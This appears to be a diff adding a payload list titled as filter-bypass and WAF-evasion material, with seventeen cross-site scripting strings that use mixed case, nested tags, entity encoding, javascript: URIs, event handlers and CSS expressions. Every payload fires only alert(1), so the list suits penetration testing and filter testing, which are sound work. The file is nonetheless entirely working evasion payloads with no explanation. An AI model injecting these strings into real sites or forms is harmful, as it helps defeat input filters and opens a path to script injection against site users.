@@ -1,0 +1,18 @@
+# Filter bypass / WAF evasion payloads
+<ScRiPt>alert(1)</ScRiPt>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<script >alert(1)</script >
+<script	>alert(1)</script>
+<svg/onload=alert(1)>
+<svg onload=alert&lpar;1&rpar;>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
+<svg><script>alert&#40;1&#41;</script>
+<iframe src="javascript:alert(1)">
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<a href="javascript:alert(1)">click</a>
+<math><mtext></mtext></math><script>alert(1)</script>
+<table><td background="javascript:alert(1)">
+<div style="width:expression(alert(1))">
+<x onclick=alert(1)>click
+<x onmouseover=alert(1)>hover
